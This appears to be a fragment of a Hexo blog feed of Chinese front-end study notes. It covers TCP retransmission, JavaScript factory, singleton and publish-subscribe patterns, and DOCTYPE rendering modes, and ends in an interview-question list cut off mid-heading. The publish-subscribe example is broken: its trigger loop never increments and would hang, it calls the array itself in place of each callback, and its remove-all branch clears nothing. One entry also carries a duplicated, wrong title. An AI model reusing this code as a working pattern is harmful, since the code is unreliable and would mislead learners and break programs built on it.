<p>如果发送方发现收到三个连续的重复 ACK，或者超时了还没有收到任何 ACK，就会确认丢包，即5号包遗失了，从而再次发送这个包。通过这种机制，TCP 保证了不会有数据包丢失。</p>
<p><img src="/static/img/tcp12.png"><br><br>（图片说明：Host B 没有收到100号数据包，会连续发出相同的 ACK，触发 Host A 重发100号数据包。）</p>
]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>TCP</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-设计模式</title>
    <url>/2018/04/17/%E7%BB%BC%E5%90%88_%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h2><h3 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>与创建型模式类似，工厂模式创建对象（视为工厂里的产品）时无需指定创建对象的具体类。</p>
<p>工厂模式定义一个用于创建对象的接口，这个接口由子类决定实例化哪一个类。该模式使一个类的实例化延迟到了子类。而子类可以重写接口方法以便创建的时候指定自己的对象类型。</p>
<p>这个模式十分有用，尤其是创建对象的流程赋值的时候，比如依赖于很多设置文件等。并且，你会经常在程序里看到工厂方法，用于让子类定义需要创建的对象类型。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> CarFactory = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> carManager = &#123;&#125;;</span><br><span class="line">    carManager.Car = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.type = <span class="string">'car'</span></span><br><span class="line">    &#125;</span><br><span class="line">    carManager.Truck = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.type = <span class="string">'truck'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">type</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> carManager[type]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> car = CarFactory(<span class="string">'Car'</span>);</span><br><span class="line"><span class="keyword">var</span> truck = CarFactory(<span class="string">'Truck'</span>);</span><br></pre></td></tr></table></figure>
<h4 id="工厂模式使用场景"><a href="#工厂模式使用场景" class="headerlink" title="工厂模式使用场景"></a>工厂模式使用场景</h4><ol>
<li>对象的构建十分复杂</li>
<li>需要依赖具体环境创建不同实例</li>
<li>处理大量具有相同属性的小对象</li>
</ol>
<h3 id="单体模式"><a href="#单体模式" class="headerlink" title="单体模式"></a>单体模式</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>在传统开发工程师眼里，单例就是保证一个类只有一个实例，实现的方法一般是先判断实例存在与否，如果存在直接返回，如果不存在就创建了再返回，这就确保了一个类只有一个实例对象。在JavaScript里，单例作为一个命名空间提供者，从全局命名空间里提供一个唯一的访问点来访问该对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Universe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> Universe.instance === <span class="string">'object'</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> Universe.instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.start_time = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.bang = <span class="string">'Big'</span>;</span><br><span class="line"></span><br><span class="line">    Universe.instance = <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> u1 = <span class="keyword">new</span> Universe();</span><br><span class="line"><span class="keyword">var</span> u2 = <span class="keyword">new</span> Universe();</span><br><span class="line"><span class="built_in">console</span>.log(u1 === u2); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h3 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p>发布—订阅模式又叫观察者模式，它定义了对象间的一种一对多的关系，让多个观察者对象同时监听某一个主题对象，当一个对象发生改变时，所有依赖于它的对象都将得到通知。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Event = &#123;</span><br><span class="line">    list: &#123;&#125;,</span><br><span class="line">    listen: <span class="function"><span class="keyword">function</span> (<span class="params">key, callBack</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.list[key]) &#123;</span><br><span class="line">            <span class="keyword">this</span>.list[key] = [];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.list[key].push(callBack);</span><br><span class="line">    &#125;,</span><br><span class="line">    trigger: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="built_in">arguments</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> fns = <span class="keyword">this</span>.list[key];</span><br><span class="line">        <span class="keyword">if</span> (!fns || fns.length === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; fns.length) &#123;</span><br><span class="line">            fns.call(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    remove: <span class="function"><span class="keyword">function</span> (<span class="params">key, fn</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> fns = <span class="keyword">this</span>.list[key];</span><br><span class="line">        <span class="keyword">if</span> (!fns) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!fn) &#123;</span><br><span class="line">            fns = [];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = fns.length - <span class="number">1</span>; i &gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="keyword">var</span> _fn = fns[i];</span><br><span class="line">                <span class="keyword">if</span> (_fn === fn) &#123;</span><br><span class="line">                    fns.splice(i, <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-文档模式《!DOCTYPE》</title>
    <url>/2018/04/17/%E7%BB%BC%E5%90%88_%E6%96%87%E6%A1%A3%E6%A8%A1%E5%BC%8F%3C!DOCTYPE%3E/</url>
    <content><![CDATA[<h2 id="文档模式"><a href="#文档模式" class="headerlink" title="文档模式"></a>文档模式</h2><h3 id="严格模式与混杂模式"><a href="#严格模式与混杂模式" class="headerlink" title="严格模式与混杂模式"></a>严格模式与混杂模式</h3><h4 id="不同文档模式的由来"><a href="#不同文档模式的由来" class="headerlink" title="不同文档模式的由来"></a>不同文档模式的由来</h4><p>相信了解过浏览器或浏览器厂商发展历史的同学都知道，在浏览器的发展初期，是没有什么标准可言的，各大浏览器厂商各自实现一套解析文档的方式，这对于开发者来说就如同灾难一样，开发者需要针对不同厂商的浏览器做兼容处理。慢慢的人们开始注意到标准的重要性，并成立了规范组织制定相应的标准，各个浏览器厂商也开始向标准靠拢，但随之而来的问题就是，如果一味的向标准靠拢，那必然会导致一个问题：老旧的网站将无法正常显示。为了做到向后兼容，浏览器厂商就保留了原有的文档解析方式，也就是现在所说的 <code>混杂模式</code>，同时将向标准靠拢的解析方式称为 <code>标准模式</code>，又称 <code>严格模式</code>。</p>
<p>也就是说，两种模式所代表的是浏览器解析文档的方式。而至于如果开启这两种模式，可以使用 <code>&lt;!DOCTYPE&gt;</code> 标签。</p>
<h3 id="文档类型"><a href="#文档类型" class="headerlink" title="文档类型"></a>文档类型</h3><h4 id="lt-DOCTYPE-gt"><a href="#lt-DOCTYPE-gt" class="headerlink" title="&lt;!DOCTYPE&gt;"></a>&lt;!DOCTYPE&gt;</h4><p><code>&lt;!DOCTYPE&gt;</code> 用来声明文档类型，目的告诉浏览器使用哪种模式去解析文档。说白了就是告诉浏览器在解析文档的时候是采用 <code>混杂模式</code> 还是 <code>标准模式</code>。</p>
<h6 id="开启-混杂模式-quirks-mode"><a href="#开启-混杂模式-quirks-mode" class="headerlink" title="开启 混杂模式(quirks mode)"></a>开启 混杂模式(quirks mode)</h6><p>如果浏览器发现在文档开始处没有 <code>文档类型声明</code>，即没有 <code>&lt;!DOCTYPE&gt;</code> 标签，那么浏览器默认会使用混杂模式解析文档，当然不写 <code>&lt;!DOCTYPE&gt;</code> 标签是极其不推荐的方式。</p>
<h6 id="开启-标准模式-standards-mode"><a href="#开启-标准模式-standards-mode" class="headerlink" title="开启 标准模式(standards mode)"></a>开启 标准模式(standards mode)</h6><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML 4.01 严格型 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 4.01//EN"</span>  <span class="meta-string">"http://www.w3.org/TR/html4/strict.dtd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- XHTML 1.0 严格型 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span>  <span class="meta-string">"-//W3C//DTD XHTML 1.0 Strict//EN"</span>  <span class="meta-string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- HTML 5 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上三种的任意一种都可以触发标准模式</p>
<h3 id="doctype详解"><a href="#doctype详解" class="headerlink" title="doctype详解"></a>doctype详解</h3><ol>
<li><code>&lt;!DOCTYPE&gt;</code>声明必须处于HTML文档的头部，在<code>&lt;html&gt;</code>标签之前，<code>HTML5</code>中不区分大小写</li>
<li><code>&lt;!DOCTYPE&gt;</code>声明不是一个HTML标签，是一个用于告诉浏览器当前HTMl版本的指令</li>
<li>现代浏览器的html布局引擎通过检查doctype决定使用兼容模式还是标准模式对文档进行渲染，一些浏览器有一个接近标准模型。</li>
<li>在HTML4.01中<code>&lt;!DOCTYPE&gt;</code>声明指向一个DTD，由于HTML4.01基于SGML，所以DTD指定了标记规则以保证浏览器正确渲染内容</li>
<li>HTML5不基于SGML，所以不用指定DTD</li>
</ol>
<h3 id="常见dotype"><a href="#常见dotype" class="headerlink" title="常见dotype"></a>常见dotype</h3><ol>
<li><p>HTML4.01 strict：不允许使用表现性、废弃元素（如font）以及frameset。声明：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 4.01//EN"</span> <span class="meta-string">"http://www.w3.org/TR/html4/strict.dtd"</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>HTML4.01 Transitional:允许使用表现性、废弃元素（如font），不允许使用frameset。声明：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="meta-string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>HTML4.01 Frameset:允许表现性元素，废气元素以及frameset。声明：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD HTML 4.01 Frameset//EN"</span> <span class="meta-string">"http://www.w3.org/TR/html4/frameset.dtd"</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>XHTML1.0 Strict:不使用允许表现性、废弃元素以及frameset。文档必须是结构良好的XML文档。声明：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD XHTML 1.0 Strict//EN"</span> <span class="meta-string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>XHTML1.0 Transitional:允许使用表现性、废弃元素，不允许frameset，文档必须是结构良好的XMl文档。声明：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="meta-string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>XHTML 1.0 Frameset:允许使用表现性、废弃元素以及frameset，文档必须是结构良好的XML文档。声明：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD XHTML 1.0 Frameset//EN"</span> <span class="meta-string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd"</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>HTML 5:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>DOCTYPE</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-设计模式</title>
    <url>/2018/04/17/%E7%BB%BC%E5%90%88_%E5%9F%BA%E7%A1%80%E9%A2%98/</url>
    <content><![CDATA[<h2 id="1-HTML面试知识点总结"><a href="#1-HTML面试知识点总结" class="headerlink" title="1.HTML面试知识点总结"></a>1.HTML面试知识点总结</h2><h3 id="1-1-DOCTYPE的作用是什么"><a href="#1-1-DOCTYPE的作用是什么" class="headerlink" title="1.1 DOCTYPE的作用是什么?"></a>1.1 DOCTYPE的作用是什么?</h3><h3 id="1-2-标准模式与兼容模式各有什么区别"><a href="#1-2-标准模式与兼容模式各有什么区别" class="headerlink" title="1.2 标准模式与兼容模式各有什么区别?"></a>1.2 标准模式与兼容模式各有什么区别?</h3><h3 id="1-3-HTML5为什么只需要写-lt-DOCTYPE-HTML-gt-而不需要引入DTD"><a href="#1-3-HTML5为什么只需要写-lt-DOCTYPE-HTML-gt-而不需要引入DTD" class="headerlink" title="1.3 HTML5为什么只需要写&lt;!DOCTYPE HTML&gt;,而不需要引入DTD?"></a>1.3 HTML5为什么只需要写&lt;!DOCTYPE HTML&gt;,而不需要引入DTD?</h3><h3 id="1-4-SGML、HTML、XML-和-XHTML-的区别"><a href="#1-4-SGML、HTML、XML-和-XHTML-的区别" class="headerlink" title="1.4 SGML、HTML、XML 和 XHTML 的区别?"></a>1.4 SGML、HTML、XML 和 XHTML 的区别?</h3><h3 id="1-5-DTD-介绍"><a href="#1-5-DTD-介绍" class="headerlink" title="1.5 DTD 介绍"></a>1.5 DTD 介绍</h3><h3 id="1-6-行内元素定义"><a href="#1-6-行内元素定义" class="headerlink" title="1.6 行内元素定义"></a>1.6 行内元素定义</h3><h3 id="1-7-块级元素定义"><a href="#1-7-块级元素定义" class="headerlink" title="1.7 块级元素定义"></a>1.7 块级元素定义</h3><h3 id="1-8-行内元素与块级元素的区别"><a href="#1-8-行内元素与块级元素的区别" class="headerlink" title="1.8 行内元素与块级元素的区别?"></a>1.8 行内元素与块级元素的区别?</h3><h3 id="1-9-HTML5元素的分类"><a href="#1-9-HTML5元素的分类" class="headerlink" title="1.9 HTML5元素的分类"></a>1.9 HTML5元素的分类</h3><h3 id="1-10-空元素定义"><a href="#1-10-空元素定义" class="headerlink" title="1.10 空元素定义"></a>1.10 空元素定义</h3><h3 id="1-11-link标签定义"><a href="#1-11-link标签定义" class="headerlink" title="1.11 link标签定义"></a>1.11 link标签定义</h3><h3 id="1-12-页面导入样式时，使用link和-import有什么区别"><a href="#1-12-页面导入样式时，使用link和-import有什么区别" class="headerlink" title="1.12 页面导入样式时，使用link和@import有什么区别?"></a>1.12 页面导入样式时，使用link和@import有什么区别?</h3><h3 id="1-13-你对浏览器的理解"><a href="#1-13-你对浏览器的理解" class="headerlink" title="1.13 你对浏览器的理解?"></a>1.13 你对浏览器的理解?</h3><h3 id="1-14-介绍一下你对浏览器内核的理解"><a href="#1-14-介绍一下你对浏览器内核的理解" class="headerlink" title="1.14 介绍一下你对浏览器内核的理解?"></a>1.14 介绍一下你对浏览器内核的理解?</h3><h3 id="1-15-常见的浏览器内核比较"><a href="#1-15-常见的浏览器内核比较" class="headerlink" title="1.15 常见的浏览器内核比较"></a>1.15 常见的浏览器内核比较</h3><h3 id="1-16-常见浏览器所用内核"><a href="#1-16-常见浏览器所用内核" class="headerlink" title="1.16 常见浏览器所用内核"></a>1.16 常见浏览器所用内核</h3><h3 id="1-17-浏览器的渲染原理"><a href="#1-17-浏览器的渲染原理" class="headerlink" title="1.17 浏览器的渲染原理?"></a>1.17 浏览器的渲染原理?</h3><h3 id="1-18-渲染过程中遇到JS文件怎么处理-浏览器解析过程"><a href="#1-18-渲染过程中遇到JS文件怎么处理-浏览器解析过程" class="headerlink" title="1.18 渲染过程中遇到JS文件怎么处理?(浏览器解析过程)"></a>1.18 渲染过程中遇到JS文件怎么处理?(浏览器解析过程)</h3><h3 id="1-19-async和defer的作用是什么-有什么区别-浏览器解析过程"><a href="#1-19-async和defer的作用是什么-有什么区别-浏览器解析过程" class="headerlink" title="1.19 async和defer的作用是什么?有什么区别?(浏览器解析过程)"></a>1.19 async和defer的作用是什么?有什么区别?(浏览器解析过程)</h3><h3 id="1-20-什么是文档的预解析-浏览器解析过程"><a href="#1-20-什么是文档的预解析-浏览器解析过程" class="headerlink" title="1.20 什么是文档的预解析?(浏览器解析过程)"></a>1.20 什么是文档的预解析?(浏览器解析过程)</h3><h3 id="1-21-CSS如何阻塞文档解析-浏览器解析过程"><a href="#1-21-CSS如何阻塞文档解析-浏览器解析过程" class="headerlink" title="1.21 CSS如何阻塞文档解析?(浏览器解析过程)"></a>1.21 CSS如何阻塞文档解析?(浏览器解析过程)</h3><h3 id="1-22-渲染页面时常见哪些不良现象-浏览器渲染过程"><a href="#1-22-渲染页面时常见哪些不良现象-浏览器渲染过程" class="headerlink" title="1.22 渲染页面时常见哪些不良现象?(浏览器渲染过程)"></a>1.22 渲染页面时常见哪些不良现象?(浏览器渲染过程)</h3><h3 id="1-23-如何优化关键渲染路径-浏览器渲染过程"><a href="#1-23-如何优化关键渲染路径-浏览器渲染过程" class="headerlink" title="1.23 如何优化关键渲染路径?(浏览器渲染过程)"></a>1.23 如何优化关键渲染路径?(浏览器渲染过程)</h3><h3 id="1-24-什么是重绘和回流-浏览器绘制过程"><a href="#1-24-什么是重绘和回流-浏览器绘制过程" class="headerlink" title="1.24 什么是重绘和回流?(浏览器绘制过程)"></a>1.24 什么是重绘和回流?(浏览器绘制过程)</h3><h3 id="1-25-如何减少回流-〔浏览器绘制过程"><a href="#1-25-如何减少回流-〔浏览器绘制过程" class="headerlink" title="1.25 如何减少回流?〔浏览器绘制过程)"></a>1.25 如何减少回流?〔浏览器绘制过程)</h3><h3 id="1-26-为什么操作DOM慢-浏览器绘制过程"><a href="#1-26-为什么操作DOM慢-浏览器绘制过程" class="headerlink" title="1.26 为什么操作DOM慢?(浏览器绘制过程)"></a>1.26 为什么操作DOM慢?(浏览器绘制过程)</h3><h3 id="1-27-DOMContentLoaded-事件和-Load-事件的区别"><a href="#1-27-DOMContentLoaded-事件和-Load-事件的区别" class="headerlink" title="1.27 DOMContentLoaded 事件和 Load 事件的区别?"></a>1.27 DOMContentLoaded 事件和 Load 事件的区别?</h3><h3 id="1-28-HTML5有哪些新特性、移除了那些元素"><a href="#1-28-HTML5有哪些新特性、移除了那些元素" class="headerlink" title="1.28 HTML5有哪些新特性、移除了那些元素?"></a>1.28 HTML5有哪些新特性、移除了那些元素?</h3><h3 id="1-29-如何处理HTML5新标签的浏览器兼容问题"><a href="#1-29-如何处理HTML5新标签的浏览器兼容问题" class="headerlink" title="1.29 如何处理HTML5新标签的浏览器兼容问题?"></a>1.29 如何处理HTML5新标签的浏览器兼容问题?</h3><h3 id="1-30-简述一下你对HTML语义化的理解"><a href="#1-30-简述一下你对HTML语义化的理解" class="headerlink" title="1.30 简述一下你对HTML语义化的理解?"></a>1.30 简述一下你对HTML语义化的理解?</h3><h3 id="1-31-b与strong的区别-amp-i与em的区别"><a href="#1-31-b与strong的区别-amp-i与em的区别" class="headerlink" title="1.31 b与strong的区别 &amp; i与em的区别?"></a>1.31 b与strong的区别 &amp; i与em的区别?</h3><h3 id="1-32-前端需要注意哪些SEO"><a href="#1-32-前端需要注意哪些SEO" class="headerlink" title="1.32 前端需要注意哪些SEO ?"></a>1.32 前端需要注意哪些SEO ?</h3><h3 id="1-33-HTML5的离线储存怎么使用，工作原理能不能解释一下"><a href="#1-33-HTML5的离线储存怎么使用，工作原理能不能解释一下" class="headerlink" title="1.33 HTML5的离线储存怎么使用，工作原理能不能解释一下?"></a>1.33 HTML5的离线储存怎么使用，工作原理能不能解释一下?</h3><h3 id="1-34-浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢"><a href="#1-34-浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢" class="headerlink" title="1.34 浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢?"></a>1.34 浏览器是怎么对HTML5的离线储存资源进行管理和加载的呢?</h3><h3 id="1-35-常见的浏览器端的存储技术有哪些"><a href="#1-35-常见的浏览器端的存储技术有哪些" class="headerlink" title="1.35 常见的浏览器端的存储技术有哪些?"></a>1.35 常见的浏览器端的存储技术有哪些?</h3><h3 id="1-36-请描述一下-cookies-sessionStorage-和-localStorage-的区别"><a href="#1-36-请描述一下-cookies-sessionStorage-和-localStorage-的区别" class="headerlink" title="1.36 请描述一下 cookies, sessionStorage 和 localStorage 的区别?"></a>1.36 请描述一下 cookies, sessionStorage 和 localStorage 的区别?</h3><h3 id="1-37-iframe有那些缺点"><a href="#1-37-iframe有那些缺点" class="headerlink" title="1.37 iframe有那些缺点?"></a>1.37 iframe有那些缺点?</h3><h3 id="1-38-Label的作用是什么-是怎么用的"><a href="#1-38-Label的作用是什么-是怎么用的" class="headerlink" title="1.38 Label的作用是什么?是怎么用的?"></a>1.38 Label的作用是什么?是怎么用的?</h3><h3 id="1-40-如何实现浏览器内多个标签内的通信？"><a href="#1-40-如何实现浏览器内多个标签内的通信？" class="headerlink" title="1.40 如何实现浏览器内多个标签内的通信？"></a>1.40 如何实现浏览器内多个标签内的通信？</h3><h3 id="1-41-webSocket如何兼容低版本浏览器"><a href="#1-41-webSocket如何兼容低版本浏览器" class="headerlink" title="1.41 webSocket如何兼容低版本浏览器?"></a>1.41 webSocket如何兼容低版本浏览器?</h3><h3 id="1-42-页面可见性-PageVisibilityAPI-可以有哪些用途"><a href="#1-42-页面可见性-PageVisibilityAPI-可以有哪些用途" class="headerlink" title="1.42 页面可见性(PageVisibilityAPI)可以有哪些用途?"></a>1.42 页面可见性(PageVisibilityAPI)可以有哪些用途?</h3><h3 id="1-43-如何在页面上实现一个圆形的可点击区域"><a href="#1-43-如何在页面上实现一个圆形的可点击区域" class="headerlink" title="1.43 如何在页面上实现一个圆形的可点击区域?"></a>1.43 如何在页面上实现一个圆形的可点击区域?</h3><h3 id="1-44-实现不使用border画出1-px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果。"><a href="#1-44-实现不使用border画出1-px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果。" class="headerlink" title="1.44 实现不使用border画出1 px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果。"></a>1.44 实现不使用border画出1 px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果。</h3><h3 id="1-45-title-与-h1-的区别"><a href="#1-45-title-与-h1-的区别" class="headerlink" title="1.45 title 与 h1 的区别?"></a>1.45 title 与 h1 的区别?</h3><h3 id="1-46-的-title-和-alt-有什么区别"><a href="#1-46-的-title-和-alt-有什么区别" class="headerlink" title="1.46  的 title 和 alt 有什么区别?"></a>1.46 <img> 的 title 和 alt 有什么区别?</h3><h3 id="1-47-Canvas和SVG有什么区别"><a href="#1-47-Canvas和SVG有什么区别" class="headerlink" title="1.47 Canvas和SVG有什么区别?"></a>1.47 Canvas和SVG有什么区别?</h3><h3 id="1-48-网页验证码是干嘛的，是为了解决什么安全问题"><a href="#1-48-网页验证码是干嘛的，是为了解决什么安全问题" class="headerlink" title="1.48 网页验证码是干嘛的，是为了解决什么安全问题?"></a>1.48 网页验证码是干嘛的，是为了解决什么安全问题?</h3><h3 id="1-49-渐进增强和优雅降级的定义"><a href="#1-49-渐进增强和优雅降级的定义" class="headerlink" title="1.49 渐进增强和优雅降级的定义"></a>1.49 渐进增强和优雅降级的定义</h3><h3 id="1-50-attribute-和-property-的医别是什么"><a href="#1-50-attribute-和-property-的医别是什么" class="headerlink" title="1.50 attribute 和 property 的医别是什么?"></a>1.50 attribute 和 property 的医别是什么?</h3><h3 id="1-51-对web标准、可用性、可访问性的理解"><a href="#1-51-对web标准、可用性、可访问性的理解" class="headerlink" title="1.51 对web标准、可用性、可访问性的理解"></a>1.51 对web标准、可用性、可访问性的理解</h3><h3 id="1-52-IE各版本和Chrome可以并行下载多少个资源"><a href="#1-52-IE各版本和Chrome可以并行下载多少个资源" class="headerlink" title="1.52 IE各版本和Chrome可以并行下载多少个资源?"></a>1.52 IE各版本和Chrome可以并行下载多少个资源?</h3><h3 id="1-53-Flash、Ajax各自的优缺点，在使用中如何取舍"><a href="#1-53-Flash、Ajax各自的优缺点，在使用中如何取舍" class="headerlink" title="1.53 Flash、Ajax各自的优缺点，在使用中如何取舍?"></a>1.53 Flash、Ajax各自的优缺点，在使用中如何取舍?</h3><h3 id="1-54-怎么重构页面"><a href="#1-54-怎么重构页面" class="headerlink" title="1.54 怎么重构页面?"></a>1.54 怎么重构页面?</h3><h3 id="1-55-浏览器架构"><a href="#1-55-浏览器架构" class="headerlink" title="1.55 浏览器架构"></a>1.55 浏览器架构</h3><h3 id="1-56-常用的meta标签"><a href="#1-56-常用的meta标签" class="headerlink" title="1.56 常用的meta标签"></a>1.56 常用的meta标签</h3><h3 id="1-57-css-reset-和-normalize-css-有什么区别"><a href="#1-57-css-reset-和-normalize-css-有什么区别" class="headerlink" title="1.57 css reset 和 normalize.css 有什么区别?"></a>1.57 css reset 和 normalize.css 有什么区别?</h3><h4 id="1-Normalize-css保护了有价值的默认值"><a href="#1-Normalize-css保护了有价值的默认值" class="headerlink" title="1 Normalize.css保护了有价值的默认值"></a>1 Normalize.css保护了有价值的默认值</h4><h4 id="2-Normalize-css-修复了浏览器的-bug"><a href="#2-Normalize-css-修复了浏览器的-bug" class="headerlink" title="2 Normalize.css 修复了浏览器的 bug"></a>2 Normalize.css 修复了浏览器的 bug</h4><h4 id="3-Normalize-css没有复杂的继承链"><a href="#3-Normalize-css没有复杂的继承链" class="headerlink" title="3 Normalize.css没有复杂的继承链"></a>3 Normalize.css没有复杂的继承链</h4><h4 id="4-Normalize-css-是模块化的"><a href="#4-Normalize-css-是模块化的" class="headerlink" title="4 Normalize.css 是模块化的"></a>4 Normalize.css 是模块化的</h4><h4 id="5-Normalize-css拥有详细的文档"><a href="#5-Normalize-css拥有详细的文档" class="headerlink" title="5 Normalize.css拥有详细的文档"></a>5 Normalize.css拥有详细的文档</h4><h3 id="1-58-用于预格式化文本的标签是"><a href="#1-58-用于预格式化文本的标签是" class="headerlink" title="1.58 用于预格式化文本的标签是?"></a>1.58 用于预格式化文本的标签是?</h3><h3 id="1-59-DHTML-是什么"><a href="#1-59-DHTML-是什么" class="headerlink" title="1.59 DHTML 是什么?"></a>1.59 DHTML 是什么?</h3><h3 id="1-60-head标签中必不少的是"><a href="#1-60-head标签中必不少的是" class="headerlink" title="1.60 head标签中必不少的是?"></a>1.60 head标签中必不少的是?</h3><h3 id="1-61-HTML5新增的表单元素有"><a href="#1-61-HTML5新增的表单元素有" class="headerlink" title="1.61 HTML5新增的表单元素有?"></a>1.61 HTML5新增的表单元素有?</h3><h3 id="1-62-在HTML5中，哪个方法用于获得用户的当前位置"><a href="#1-62-在HTML5中，哪个方法用于获得用户的当前位置" class="headerlink" title="1.62 在HTML5中，哪个方法用于获得用户的当前位置?"></a>1.62 